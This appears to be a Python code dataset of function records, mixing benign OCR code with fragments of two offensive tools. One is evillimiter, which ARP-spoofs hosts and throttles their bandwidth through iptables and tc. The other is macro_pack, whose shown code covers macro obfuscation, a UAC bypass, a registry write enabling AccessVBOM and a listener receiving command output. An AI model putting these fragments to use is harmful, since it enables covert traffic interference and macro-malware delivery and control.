1.0-pred[i,0]\n    else:\n        # For the multi-class case, we use all output variables.\n        deltas[:,:] = -pred[:,:]\n        for i,c in enumerate(cs):\n            deltas[i,c] = 1.0-pred[i,c]\nself.backward(deltas)\nself.update()\nreturn pred", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"An MLP implementation by stacking two `Logreg` networks on top\nof each other.\"\"\"\n", "func_signal": "def MLP1(Ni,Ns,No):\n", "code": "lr1 = Logreg(Ni,Ns)\nlr2 = Logreg(Ns,No)\nstacked = Stacked([lr1,lr2])\nreturn stacked", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Bottleneck architecture for > 34 layer resnet.\nFollows improved proposed scheme in http://arxiv.org/pdf/1603.05027v2.pdf\nReturns:\n    A final conv layer of filters * 4\n\"\"\"\n", "func_signal": "def bottleneck(filters, init_strides=(1, 1), is_first_block_of_first_layer=False):\n", "code": "def f(input):\n\n    if is_first_block_of_first_layer:\n        # don't repeat bn->relu since we just did bn->relu->maxpool\n        conv_1_1 = Conv2D(filters=filters, kernel_size=(1, 1),\n                          strides=init_strides,\n                          padding=\"same\",\n                          kernel_initializer=\"he_normal\",\n                          kernel_regularizer=l2(1e-4))(input)\n    else:\n        conv_1_1 = _bn_relu_conv(filters=filters, kernel_size=(1, 1),\n                                 strides=init_strides)(input)\n\n    conv_3_3 = _bn_relu_conv(filters=filters, kernel_size=(3, 3))(conv_1_1)\n    residual = _bn_relu_conv(filters=filters * 4, kernel_size=(1, 1))(conv_3_3)\n    return _shortcut(input, residual)\n\nreturn f", "path": "deep_ocr/scripts/training/keras_training.py", "commit_date": "2017-09-30 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Perform forward propagation of activations for a simple LSTM layer.\"\"\"\n", "func_signal": "def forward_py(n,N,ni,ns,na,xs,source,gix,gfx,gox,cix,gi,gf,go,ci,state,output,WGI,WGF,WGO,WCI,WIP,WFP,WOP):\n", "code": "for t in range(n):\n    prev = zeros(ns) if t==0 else output[t-1]\n    source[t,0] = 1\n    source[t,1:1+ni] = xs[t]\n    source[t,1+ni:] = prev\n    dot(WGI,source[t],out=gix[t])\n    dot(WGF,source[t],out=gfx[t])\n    dot(WGO,source[t],out=gox[t])\n    dot(WCI,source[t],out=cix[t])\n    if t>0:\n        gix[t] += WIP*state[t-1]\n        gfx[t] += WFP*state[t-1]\n    gi[t] = ffunc(gix[t])\n    gf[t] = ffunc(gfx[t])\n    ci[t] = gfunc(cix[t])\n    state[t] = ci[t]*gi[t]\n    if t>0:\n        state[t] += gf[t]*state[t-1]\n        gox[t] += WOP*state[t]\n    go[t] = ffunc(gox[t])\n    output[t] = hfunc(state[t]) * go[t]\nassert not isnan(output[:n]).any()", "path": "deep_ocr/deep_ocr/ocrolib/lstm.py", "commit_date": "2017-10-07 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"Overlays the computed lines on top of the image, for debugging\npurposes.\"\"\"\n", "func_signal": "def show_lines(image,lines,lsort):\n", "code": "ys,xs = [],[]\nclf(); cla()\nimshow(image)\nfor i in range(len(lines)):\n    l = lines[lsort[i]]\n    y,x = sl.center(l.bounds)\n    xs.append(x)\n    ys.append(y)\n    o = l.bounds\n    r = matplotlib.patches.Rectangle((o[1].start,o[0].start),edgecolor='r',fill=0,width=sl.dim1(o),height=sl.dim0(o))\n    gca().add_patch(r)\nh,w = image.shape\nylim(h,0); xlim(0,w)\nplot(xs,ys)", "path": "deep_ocr/deep_ocr/ocrolib/psegutils.py", "commit_date": "2017-10-06 00:00:00", "repo_name": "JinpengLI/deep_ocr", "stars": 1514, "license": "None", "language": "python", "size": 345}
{"docstring": "\"\"\"\nStarts the menu input loop.\nCommands will be processed and handled.\n\"\"\"\n", "func_signal": "def start(self):\n", "code": "self._active = True\n\nwhile self._active:\n    try:\n        command = IO.input(self.prompt)\n    except KeyboardInterrupt:\n        self.interrupt_handler()\n        break\n\n    # split command by spaces and parse the arguments\n    parsed_args = self.parser.parse(command.split())\n    if parsed_args is not None:\n        self.argument_handler(parsed_args)", "path": "evillimiter/evillimiter/menus/menu.py", "commit_date": "2019-03-27 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nHandles 'monitor' command-line argument\nMonitors hosts bandwidth usage\n\"\"\"\n", "func_signal": "def _monitor_handler(self, args):\n", "code": "def get_bandwidth_results():\n    with self.hosts_lock:\n        return [x for x in [(y, self.bandwidth_monitor.get(y)) for y in self.hosts] if x[1] is not None]\n\ndef display(stdscr, interval):\n    host_results = get_bandwidth_results()\n    hname_max_len = max([len(x[0].name) for x in host_results])\n\n    header_off = [\n        ('ID', 5), ('IP address', 18), ('Hostname', hname_max_len + 2),\n        ('Current (per s)', 20), ('Total', 16), ('Packets', 0)\n    ]\n\n    y_rst = 1\n    x_rst = 2\n\n    while True:\n        y_off = y_rst\n        x_off = x_rst\n\n        stdscr.clear()\n\n        for header in header_off:\n            stdscr.addstr(y_off, x_off, header[0])\n            x_off += header[1]\n\n        y_off += 2\n        x_off = x_rst\n\n        for host, result in host_results:\n            result_data = [\n                str(self._get_host_id(host)),\n                host.ip,\n                host.name,\n                '{}\u2191 {}\u2193'.format(result.upload_rate, result.download_rate),\n                '{}\u2191 {}\u2193'.format(result.upload_total_size, result.download_total_size),\n                '{}\u2191 {}\u2193'.format(result.upload_total_count, result.download_total_count)\n            ]\n\n            for j, string in enumerate(result_data):\n                stdscr.addstr(y_off, x_off, string)\n                x_off += header_off[j][1]\n\n            y_off += 1\n            x_off = x_rst\n\n        y_off += 2\n        stdscr.addstr(y_off, x_off, 'press \\'ctrl+c\\' to exit.')\n\n        try:\n            stdscr.refresh()\n            time.sleep(interval)\n            host_results = get_bandwidth_results()\n        except KeyboardInterrupt:\n            return\n            \n\ninterval = 0.5  # in s\nif args.interval:\n    if not args.interval.isdigit():\n        IO.error('invalid interval.')\n        return\n\n    interval = int(args.interval) / 1000    # from ms to s\n\nif len(get_bandwidth_results()) == 0:\n    IO.error('no hosts to be monitored.')\n    return\n\ntry:\n    curses.wrapper(display, interval)\nexcept curses.error:\n    IO.error('monitor error occurred. maybe terminal too small?')", "path": "evillimiter/evillimiter/menus/main_menu.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nReturns unique IDs that are\ncurrently not in use\n\"\"\"\n", "func_signal": "def _create_ids(self):\n", "code": "def generate_id(*exc):\n    \"\"\"\n    Generates a unique, unused ID\n    exc: IDs that will not be used (exceptions)\n    \"\"\"\n    id_ = 1\n    with self._host_dict_lock:\n        while True:\n            if id_ not in exc:\n                v = (x for x in self._host_dict.values())\n                ids = (x['ids'] for x in v)\n                if id_ not in (x for y in ids for x in [y.upload_id, y.download_id]):\n                    return id_\n            id_ += 1\n\nid1 = generate_id()\nreturn (id1, generate_id(id1))", "path": "evillimiter/evillimiter/networking/limit.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nSets up requirements, e.g. IP-Forwarding, 3rd party applications\n\"\"\"\n", "func_signal": "def initialize(interface):\n", "code": "if not netutils.create_qdisc_root(interface):\n    IO.spacer()\n    IO.error('qdisc root handle could not be created. maybe flush network settings (--flush).')\n    return False\n\nif not netutils.enable_ip_forwarding():\n    IO.spacer()\n    IO.error('ip forwarding could not be enabled.')\n    return False\n\nreturn True", "path": "evillimiter/evillimiter/evillimiter.py", "commit_date": "2019-05-27 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nDeletes the tc class and applied filters\nfor a given ID (host)\n\"\"\"\n", "func_signal": "def _delete_tc_class(self, id_):\n", "code": "shell.execute_suppressed('{} filter del dev {} parent 1:0 prio {}'.format(BIN_TC, self.interface, id_))\nshell.execute_suppressed('{} class del dev {} parent 1:0 classid 1:{}'.format(BIN_TC, self.interface, id_))", "path": "evillimiter/evillimiter/networking/limit.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nProcesses the specified command-line arguments, adds them to a named tuple\nand returns.\nExecutes actions specified in the command line, e.g. flush network settings\n\"\"\"\n", "func_signal": "def process_arguments(args):\n", "code": "if args.interface is None:\n    interface = netutils.get_default_interface()\n    if interface is None:\n        IO.error('default interface could not be resolved. specify manually (-i).')\n        return\nelse:\n    interface = args.interface\n    if not netutils.exists_interface(interface):\n        IO.error('interface {}{}{} does not exist.'.format(IO.Fore.LIGHTYELLOW_EX, interface, IO.Style.RESET_ALL))\n        return\n\nIO.ok('interface: {}{}{}'.format(IO.Fore.LIGHTYELLOW_EX, interface, IO.Style.RESET_ALL))\n\nif args.gateway_ip is None:\n    gateway_ip = netutils.get_default_gateway()\n    if gateway_ip is None:\n        IO.error('default gateway address could not be resolved. specify manually (-g).')\n        return\nelse:\n    gateway_ip = args.gateway_ip\n\nIO.ok('gateway ip: {}{}{}'.format(IO.Fore.LIGHTYELLOW_EX, gateway_ip, IO.Style.RESET_ALL))\n\nif args.gateway_mac is None:\n    gateway_mac = netutils.get_mac_by_ip(interface, gateway_ip)\n    if gateway_mac is None:\n        IO.error('gateway mac address could not be resolved.')\n        return\nelse:\n    if netutils.validate_mac_address(args.gateway_mac):\n        gateway_mac = args.gateway_mac.lower()\n    else:\n        IO.error('gateway mac is invalid.')\n        return\n\nIO.ok('gateway mac: {}{}{}'.format(IO.Fore.LIGHTYELLOW_EX, gateway_mac, IO.Style.RESET_ALL))\n\nif args.netmask is None:\n    netmask = netutils.get_default_netmask(interface)\n    if netmask is None:\n        IO.error('netmask could not be resolved. specify manually (-n).')\n        return\nelse:\n    netmask = args.netmask\n\nIO.ok('netmask: {}{}{}'.format(IO.Fore.LIGHTYELLOW_EX, netmask, IO.Style.RESET_ALL))\n\nif args.flush:\n    netutils.flush_network_settings(interface)\n    IO.spacer()\n    IO.ok('flushed network settings')\n\nreturn InitialArguments(interface=interface, gateway_ip=gateway_ip, gateway_mac=gateway_mac, netmask=netmask)", "path": "evillimiter/evillimiter/evillimiter.py", "commit_date": "2019-05-27 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nMain entry point of the application\n\"\"\"\n", "func_signal": "def run():\n", "code": "version = get_version()\nargs = parse_arguments()\n\nIO.initialize(args.colorless)\nIO.print(get_main_banner(version))\n\nif not is_linux():\n    IO.error('run under linux.')\n    return\n\nif not is_privileged():\n    IO.error('run as root.')\n    return\n\nargs = process_arguments(args)\n\nif args is None:\n    return\n\nif initialize(args.interface):\n    IO.spacer()        \n    menu = MainMenu(version, args.interface, args.gateway_ip, args.gateway_mac, args.netmask)\n    menu.start()\n    cleanup(args.interface)", "path": "evillimiter/evillimiter/evillimiter.py", "commit_date": "2019-05-27 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nGet limit information for corresponding host\nIf not present, create new \n\"\"\"\n", "func_signal": "def _new_host_limit_ids(self, host, direction):\n", "code": "host_ids = None\n\nself._host_dict_lock.acquire()\npresent = host in self._host_dict\nself._host_dict_lock.release()\n\nif present:\n        host_ids = self._host_dict[host]['ids']\n        self.unlimit(host, direction)\n\nreturn Limiter.HostLimitIDs(*self._create_ids()) if host_ids is None else host_ids", "path": "evillimiter/evillimiter/networking/limit.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nCallback that is called when a watched host reconnects\nMethod will run in a separate thread\n\"\"\"\n", "func_signal": "def _reconnect_callback(self, old_host, new_host):\n", "code": "with self.hosts_lock:\n    if old_host in self.hosts:\n        self.hosts[self.hosts.index(old_host)] = new_host\n    else:\n        return\n\nself.arp_spoofer.remove(old_host, restore=False)\nself.arp_spoofer.add(new_host)\n\nself.host_watcher.remove(old_host)\nself.host_watcher.add(new_host)\n\nself.limiter.replace(old_host, new_host)\nself.bandwidth_monitor.replace(old_host, new_host)", "path": "evillimiter/evillimiter/menus/main_menu.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nAdds a parameter command that does not require an identifier.\nIt is required to cover all parameter commands.\n\nE.g. '24' or 'hello'\nBoth are standalone values (parameters).\n\"\"\"\n", "func_signal": "def add_parameter(self, name):\n", "code": "command = CommandParser.ParameterCommand(\n    type=CommandParser.CommandType.PARAMETER_COMMAND,\n    name=name\n)\n\nself._parameter_commands.append(command)", "path": "evillimiter/evillimiter/menus/parser.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nHandles 'watch remove' command-line argument\nRemoves host from the reconnection watch list\n\"\"\"\n", "func_signal": "def _watch_remove_handler(self, args):\n", "code": "hosts = self._get_hosts_by_ids(args.id)\nif hosts is None or len(hosts) == 0:\n    return\n\nfor host in hosts:\n    self.host_watcher.remove(host)", "path": "evillimiter/evillimiter/menus/main_menu.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nDeletes iptables rules for a given ID (host)\n\"\"\"\n", "func_signal": "def _delete_iptables_entries(self, host, direction, id_):\n", "code": "if (direction & Direction.OUTGOING) == Direction.OUTGOING:\n    shell.execute_suppressed('{} -t mangle -D POSTROUTING -s {} -j MARK --set-mark {}'.format(BIN_IPTABLES, host.ip, id_))\n    shell.execute_suppressed('{} -t filter -D FORWARD -s {} -j DROP'.format(BIN_IPTABLES, host.ip))\nif (direction & Direction.INCOMING) == Direction.INCOMING:\n    shell.execute_suppressed('{} -t mangle -D PREROUTING -d {} -j MARK --set-mark {}'.format(BIN_IPTABLES, host.ip, id_))\n    shell.execute_suppressed('{} -t filter -D FORWARD -d {} -j DROP'.format(BIN_IPTABLES, host.ip))", "path": "evillimiter/evillimiter/networking/limit.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nHandles 'watch set' command-line argument\nModifies settings of the reconnection reconnection watcher\n\"\"\"\n", "func_signal": "def _watch_set_handler(self, args):\n", "code": "if args.attribute.lower() in ('range', 'iprange', 'ip_range'):\n    iprange = self._parse_iprange(args.value)\n    if iprange is not None:\n        self.host_watcher.iprange = iprange\n    else:\n        IO.error('invalid ip range.')\nelif args.attribute.lower() in ('interval'):\n    if args.value.isdigit():\n        self.host_watcher.interval = int(args.value)\n    else:\n        IO.error('invalid interval.')\nelse:\n    IO.error('{}{}{} is an invalid settings attribute.'.format(IO.Fore.LIGHTYELLOW_EX, args.attribute, IO.Style.RESET_ALL))", "path": "evillimiter/evillimiter/menus/main_menu.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nHandles 'add' command-line argument\nAdds custom host to host list\n\"\"\"\n", "func_signal": "def _add_handler(self, args):\n", "code": "ip = args.ip\nif not netutils.validate_ip_address(ip):\n    IO.error('invalid ip address.')\n    return\n\nif args.mac:\n    mac = args.mac\n    if not netutils.validate_mac_address(mac):\n        IO.error('invalid mac address.')\n        return\nelse:\n    mac = netutils.get_mac_by_ip(self.interface, ip)\n    if mac is None:\n        IO.error('unable to resolve mac address. specify manually (--mac).')\n        return\n\nname = None\ntry:\n    host_info = socket.gethostbyaddr(ip)\n    name = None if host_info is None else host_info[0]\nexcept socket.herror:\n    pass\n\nhost = Host(ip, mac, name)\n\nwith self.hosts_lock:\n    if host in self.hosts:\n        IO.error('host does already exist.')\n        return\n\n    self.hosts.append(host) \n\nIO.ok('host added.')", "path": "evillimiter/evillimiter/menus/main_menu.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nHandler for the 'clear' command-line argument\nClears the terminal window and re-prints the banner\n\"\"\"\n", "func_signal": "def _clear_handler(self, args):\n", "code": "IO.clear()\nIO.print(get_main_banner(self.version))\nself._print_help_reminder()", "path": "evillimiter/evillimiter/menus/main_menu.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nAdds a parameterized flag that carries a value.\nParameterized flags are optional.\nE.g. '-ip 192.168.0.0.1'\n\"\"\"\n", "func_signal": "def add_parameterized_flag(self, identifier, name):\n", "code": "command = CommandParser.FlagCommand(\n    type=CommandParser.CommandType.PARAMETERIZED_FLAG_COMMAND,\n    identifier=identifier,\n    name=name\n)\n\nself._flag_commands.append(command)", "path": "evillimiter/evillimiter/menus/parser.py", "commit_date": "2019-03-28 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nHandles 'limit' command-line argument\nLimits bandwith of host to specified rate\n\"\"\"\n", "func_signal": "def _limit_handler(self, args):\n", "code": "hosts = self._get_hosts_by_ids(args.id)\nif hosts is None or len(hosts) == 0:\n    return\n\ntry:\n    rate = BitRate.from_rate_string(args.rate)\nexcept Exception:\n    IO.error('limit rate is invalid.')\n    return\n\ndirection = self._parse_direction_args(args)\n\nfor host in hosts:\n    self.arp_spoofer.add(host)\n    self.limiter.limit(host, direction, rate)\n    self.bandwidth_monitor.add(host)\n\n    IO.ok('{}{}{r} {} {}limited{r} to {}.'.format(IO.Fore.LIGHTYELLOW_EX, host.ip, Direction.pretty_direction(direction), IO.Fore.LIGHTRED_EX, rate, r=IO.Style.RESET_ALL))", "path": "evillimiter/evillimiter/menus/main_menu.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nLimits the uload/dload traffic of a host\nto a specified rate\n\"\"\"\n", "func_signal": "def limit(self, host, direction, rate):\n", "code": "host_ids = self._new_host_limit_ids(host, direction)\n\nif (direction & Direction.OUTGOING) == Direction.OUTGOING:\n    # add a class to the root qdisc with specified rate\n    shell.execute_suppressed('{} class add dev {} parent 1:0 classid 1:{} htb rate {r} burst {b}'.format(BIN_TC, self.interface, host_ids.upload_id, r=rate, b=rate * 1.1))\n    # add a fw filter that filters packets marked with the corresponding ID\n    shell.execute_suppressed('{} filter add dev {} parent 1:0 protocol ip prio {id} handle {id} fw flowid 1:{id}'.format(BIN_TC, self.interface, id=host_ids.upload_id))\n    # marks outgoing packets \n    shell.execute_suppressed('{} -t mangle -A POSTROUTING -s {} -j MARK --set-mark {}'.format(BIN_IPTABLES, host.ip, host_ids.upload_id))\nif (direction & Direction.INCOMING) == Direction.INCOMING:\n    # add a class to the root qdisc with specified rate\n    shell.execute_suppressed('{} class add dev {} parent 1:0 classid 1:{} htb rate {r} burst {b}'.format(BIN_TC, self.interface, host_ids.download_id, r=rate, b=rate * 1.1))\n    # add a fw filter that filters packets marked with the corresponding ID\n    shell.execute_suppressed('{} filter add dev {} parent 1:0 protocol ip prio {id} handle {id} fw flowid 1:{id}'.format(BIN_TC, self.interface, id=host_ids.download_id))\n    # marks incoming packets\n    shell.execute_suppressed('{} -t mangle -A PREROUTING -d {} -j MARK --set-mark {}'.format(BIN_IPTABLES, host.ip, host_ids.download_id))\n\nhost.limited = True\n\nwith self._host_dict_lock:\n    self._host_dict[host] = { 'ids': host_ids, 'rate': rate, 'direction': direction }", "path": "evillimiter/evillimiter/networking/limit.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nParses the main command-line arguments (sys.argv)\nusing argparse\n\"\"\"\n", "func_signal": "def parse_arguments():\n", "code": "parser = argparse.ArgumentParser(description=get_description())\nparser.add_argument('-i', '--interface', help='network interface connected to the target network. automatically resolved if not specified.')\nparser.add_argument('-g', '--gateway-ip', dest='gateway_ip', help='default gateway ip address. automatically resolved if not specified.')\nparser.add_argument('-m', '--gateway-mac', dest='gateway_mac', help='gateway mac address. automatically resolved if not specified.')\nparser.add_argument('-n', '--netmask', help='netmask for the network. automatically resolved if not specified.')\nparser.add_argument('-f', '--flush', action='store_true', help='flush current iptables (firewall) and tc (traffic control) settings.')\nparser.add_argument('--colorless', action='store_true', help='disable colored output.')\n\nreturn parser.parse_args()", "path": "evillimiter/evillimiter/evillimiter.py", "commit_date": "2019-05-27 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\"\nHandles 'free' command-line argument\nFrees the host from all limitations\n\"\"\"\n", "func_signal": "def _free_handler(self, args):\n", "code": "hosts = self._get_hosts_by_ids(args.id)\nif hosts is not None and len(hosts) > 0:\n    for host in hosts:\n        self._free_host(host)", "path": "evillimiter/evillimiter/menus/main_menu.py", "commit_date": "2020-07-04 00:00:00", "repo_name": "bitbrute/evillimiter", "stars": 1457, "license": "mit", "language": "python", "size": 109}
{"docstring": "\"\"\" Exract the word (space separated ) following the one at current index\"\"\"\n# Look for beginning or word\n", "func_signal": "def extractNextWordInString(strToParse, index):\n", "code": "i = index\nwhile i!=len(strToParse) and strToParse[i] not in \" \\t\\n&|\":\n    i = i+1\nif len(strToParse)-i > 2:\n    while i!=0 and strToParse[i] in \" \\t\\n\\\",;\": # Skip spaces nd special char befor previous word\n        i = i+1\nif len(strToParse)-i > 2:\n    nextWord = extractWordInString(strToParse, i)\nelse:\n    nextWord = \"\"\nlogging.debug(\"     [-] Extracted next Word: %s\" % nextWord)\nreturn nextWord", "path": "macro_pack/src/common/utils.py", "commit_date": "2020-10-18 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\" \nCall this method to apply transformation and obfuscation on the content of temp directory \nThis method does obfuscation for all VBA and VBA like types\n\n\"\"\"\n\n# Enable UAC bypass\n", "func_signal": "def transformAndObfuscate(self):\n", "code": "if self.mpSession.uacBypass:\n    uacBypasser = UACBypass(self.mpSession)\n    uacBypasser.run()\n\n# Macro obfuscation\nif self.mpSession.obfuscateNames:\n    obfuscator = ObfuscateNames(self.mpSession)\n    obfuscator.run()\n# Mask strings\nif self.mpSession.obfuscateStrings:\n    obfuscator = ObfuscateStrings(self.mpSession)\n    obfuscator.run()\n# Macro obfuscation\nif self.mpSession.obfuscateForm:\n    obfuscator = ObfuscateForm(self.mpSession)\n    obfuscator.run()", "path": "macro_pack/src/modules/vba_gen.py", "commit_date": "2020-07-03 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\" returne current facing IP address \"\"\"\n", "func_signal": "def getHostIp():\n", "code": "s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\ntry:\n    # doesn't have to be reachable\n    s.connect(('10.255.255.255', 1))\n    IP = s.getsockname()[0]\nexcept:\n    IP = '127.0.0.1'\nfinally:\n    s.close()\nreturn IP", "path": "macro_pack/src/common/utils.py", "commit_date": "2020-10-18 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\" Guess MS application type based on extension \"\"\"\n", "func_signal": "def guessApplicationType(self, documentPath):\n", "code": "result = \"\"\nextension = os.path.splitext(documentPath)[1]\nif \".xls\" == extension.lower():\n    result = self.XL97\nelif extension.lower() in (\".xlsx\", \".xlsm\", \".xltm\"):\n    result = self.XL\nelif \".doc\" ==  extension.lower():\n    result = self.WD97\nelif extension.lower() in (\".docx\", \".docm\", \".dotm\"):\n    result = self.WD\nelif \".hta\" ==  extension.lower():\n    result = self.HTA\nelif \".mpp\" ==  extension.lower():\n    result = self.MPP\nelif \".ppt\" ==  extension.lower():\n    result = self.PPT97\nelif extension.lower() in (\".pptx\", \".pptm\", \".potm\"):\n    result = self.PPT\nelif \".vsd\" ==  extension.lower():\n    result = self.VSD97\nelif \".vsdm\" ==  extension.lower() or extension.lower() == \".vsdx\":\n    result = self.VSD\nelif extension.lower() in (\".accdb\", \".accde\", \".mdb\"):\n    result = self.ACC\nelif \".pub\" ==  extension.lower():\n    result = self.PUB\nelif \".vba\" ==  extension.lower():\n    result = self.VBA\nelif \".vbs\" ==  extension.lower():\n    result = self.VBS\nelif \".sct\" ==  extension.lower() or extension.lower() == \".wsc\":\n    result = self.SCT\nelif \".wsf\" == extension.lower():\n    result = self.WSF\nelif \".url\" ==  extension.lower():\n    result = self.URL\nelif \".glk\" ==  extension.lower():\n    result = self.GLK\nelif \".lnk\" ==  extension.lower():\n    result = self.LNK\nelif \".settingcontent-ms\" == extension.lower():\n    result = self.SETTINGS_MS\nelif \".library-ms\" == extension.lower():\n    result = self.LIBRARY_MS\nelif \".inf\" == extension.lower():\n    result = self.INF\nelif \".scf\" ==  extension.lower():\n    result = self.SCF\nelif \".xsl\" ==  extension.lower():\n    result = self.XSL\nelif \".iqy\" == extension.lower():\n    result = self.IQY\nelif \".slk\" ==  extension.lower():\n    result = self.SYLK\nelif \".chm\" == extension.lower():\n    result = self.CHM\nelif \".csproj\" == extension.lower():\n    result = self.CSPROJ\nelif \".cmd\" == extension.lower() or extension.lower() == \".bat\":\n    result = self.CMD\nelif extension.lower() in (\".dll\", \".ocx\"):\n    result = self.DLL\nelif extension.lower() in (\".exe\"):\n    result = self.EXE\nelif extension.lower() in (\".msi\"):\n    result = self.MSI\nelse:\n    result = self.UNKNOWN\nreturn result", "path": "macro_pack/src/common/utils.py", "commit_date": "2020-10-18 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "# Enable writing in macro (VBOM)\n# First fetch the application version\n", "func_signal": "def enableVbom(self):\n", "code": "objAccess = win32com.client.Dispatch(\"Access.Application\")\nobjAccess.Visible = False # do the operation in background \nself.version = objAccess.Application.Version\n# IT is necessary to exit office or value wont be saved\nobjAccess.Application.Quit()\ndel objAccess\n# Next change/set AccessVBOM registry value to 1\nkeyval = \"Software\\\\Microsoft\\\\Office\\\\\"  + self.version + \"\\\\Access\\\\Security\"\nlogging.info(\"   [-] Set %s to 1...\" % keyval)\nRegistrykey = winreg.CreateKey(winreg.HKEY_CURRENT_USER,keyval)\nwinreg.SetValueEx(Registrykey,\"AccessVBOM\",0,winreg.REG_DWORD,1) # \"REG_DWORD\"\nwinreg.CloseKey(Registrykey)", "path": "macro_pack/src/modules/access_gen.py", "commit_date": "2020-03-03 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\" Display generated code on stdout \"\"\"\n", "func_signal": "def printFile(self):\n", "code": "logging.info(\" [+] Generated VB code:\\n\")\nif len(self.getVBAFiles())==1: \n    vbaFile = self.getMainVBAFile() \n    with open(vbaFile,'r') as f:\n        print(f.read())\nelse:\n    logging.info(\"   [!] More then one VB file generated\")\n    for vbaFile in self.getVBAFiles():\n        with open(vbaFile,'r') as f:\n            print(\" =======================  %s  ======================== \" % vbaFile)\n            print(f.read())", "path": "macro_pack/src/modules/vba_gen.py", "commit_date": "2020-07-03 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\" called by client when responding to command \"\"\"\n#clientId = request.form['id']\n", "func_signal": "def answer():\n", "code": "cmdOutput = request.form['cmdOutput']\n#logging.info(\"   [-] From %s received:\\n %s \" % (clientId,cmdOutput))\nlogging.info(\" %s \\n \" % (cmdOutput))\nreturn make_response(\"OK\")", "path": "macro_pack/src/modules/listen_server.py", "commit_date": "2020-02-22 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
{"docstring": "\"\"\" Starts listening server\"\"\"\n\n", "func_signal": "def run(self):\n", "code": "logging.info (\" [+] Starting Macro_Pack web server...\")\nlog = logging.getLogger('werkzeug')\nlog.setLevel(logging.ERROR) # Disable flask log if easier to debug\nlogging.info (\"   [-] Files in \\\"\" + self.listenRoot + \"\\\" folder are accessible using http://{ip}:{port}/u/\".format(ip=getHostIp(), port=self.listenPort))\nlogging.info (\"   [-] Listening on port %s (ctrl-c to exit)...\" % self.listenPort)\n\n# Run web server in another thread\nwebapp.run(\n    host=\"0.0.0.0\",\n    port=int(self.listenPort),\n    #ssl_context=context\n)", "path": "macro_pack/src/modules/listen_server.py", "commit_date": "2020-02-22 00:00:00", "repo_name": "sevagas/macro_pack", "stars": 2010, "license": "apache-2.0", "language": "python", "size": 1040}
